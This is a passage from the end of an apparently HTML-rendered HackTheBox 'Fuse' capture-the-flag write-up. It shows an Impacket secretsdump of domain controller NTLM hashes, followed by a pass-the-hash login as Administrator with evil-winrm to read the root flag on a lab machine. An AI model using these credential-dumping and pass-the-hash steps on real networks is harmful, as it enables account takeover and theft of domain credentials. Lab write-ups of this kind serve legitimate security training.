+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~/HTB/Fuse<span class="nv">$ </span>secretsdump.py <span class="nt">-just-dc</span> <span class="nt">-no-pass</span> FUSE<span class="se">\$</span>@10.10.10.193
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:370ddcf45959b2293427baa70376e14e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8ee7fac1bd38751dbff06b33616b87b0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+.....
+</pre></table></code></div></div><p>we don’t need to crack hash to get password <code class="language-plaintext highlighter-rouge">evil-winrm</code> can login by hash</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+</pre><td class="rouge-code"><pre>ezi0x00@kali:~<span class="nv">$ </span><span class="nb">sudo </span>evil-winrm <span class="nt">-i</span> 10.10.10.193 <span class="nt">-u</span> Administrator <span class="nt">-H</span> <span class="s1">'370ddcf45959b2293427baa70376e14e'</span><span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>ezi0x00: 
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; cd..
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-r---         6/1/2020   2:03 AM                Contacts
+d-r---         6/1/2020   2:03 AM                Desktop
+d-r---        6/10/2020   7:18 PM                Documents
+d-r---         6/1/2020   2:03 AM                Downloads
+d-r---         6/1/2020   2:03 AM                Favorites
+d-r---         6/1/2020   2:03 AM                Links
+d-r---         6/1/2020   2:03 AM                Music
+d-r---         6/1/2020   2:03 AM                Pictures
+d-r---         6/1/2020   2:03 AM                Saved Games
+d-r---         6/1/2020   2:03 AM                Searches
+d-r---         6/1/2020   2:03 AM                Videos
+<span class="nt">-a----</span>        10/9/2020   7:55 AM     1674242175 patch.msu
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">cd </span>Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>       10/31/2020   9:43 AM             34 root.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">cat </span>root.txt
+9d47f7d9f4<span class="k">*************</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; 
+</pre></table></code></div></div><p>And we pwned the Box !</p><p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/windwos-machines/'>Windwos Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/fuse/" class="post-tag no-text-decoration" >fuse</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox — Fuse Writeup - 0xN1ghtR1ngs&url=https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox — Fuse Writeup - 0xN1ghtR1ngs&u=https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox — Fuse Writeup - 0xN1ghtR1ngs&url=https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/fuse/">fuse</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled"><p>-</p></span> <span class="btn btn-outline-primary disabled"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/username">0xN1ghtR1ngs</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/fuse/">fuse</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xn1ghtr1ngs.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-86J1B4FKH9"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-86J1B4FKH9'); </script>
